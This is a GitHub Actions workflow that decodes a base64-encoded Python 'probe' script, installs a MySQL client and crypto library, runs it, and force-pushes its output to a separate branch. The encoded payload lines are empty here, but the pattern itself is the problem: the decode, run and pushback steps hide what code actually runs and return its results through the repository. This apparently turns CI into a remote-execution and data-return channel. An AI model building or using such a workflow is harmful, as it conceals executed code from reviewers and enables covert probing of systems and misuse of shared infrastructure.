name: zz741b
on:
  push:
    branches: [ "zz-741b" ]
permissions:
  contents: write
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 35
    steps:
      - name: checkout
        uses: actions/checkout@v4
      - name: decode
        run: |
          set -e
          rm -f probe.b64
          echo '' >> probe.b64
          echo '' >> probe.b64
          echo '' >> probe.b64
          echo '' >> probe.b64
          echo '' >> probe.b64
          echo '' >> probe.b64
          echo '' >> probe.b64
          python3 -c "import base64;open('probe741.py','wb').write(base64.b64decode(open('probe.b64','rb').read()))"
          echo "payload_md5=$(md5sum probe741.py)"
      - name: deps
        run: pip install --quiet pymysql cryptography 2>&1 | tail -3
      - name: run
        run: |
          set +e
          python3 probe741.py > r741b.txt 2>&1
          echo "exit=$?"; wc -c r741b.txt
      - name: pushback
        if: always()
        run: |
          set +e
          git config user.email "probe@example.com"; git config user.name "probe"
          [ -f r741b.txt ] || echo "NORESULT" > r741b.txt
          cp -f r741b.txt zz-741b-result.txt
          ls -la
          git checkout -B zz-out741b
          git status --short | head -30
          git add -A -f -- . ':(exclude).github'
          git commit -m "zz741b result"
          git push -f origin zz-out741b 2>&1 | tail -15
          echo "PUSH_EXIT=$?"
          git rev-parse HEAD
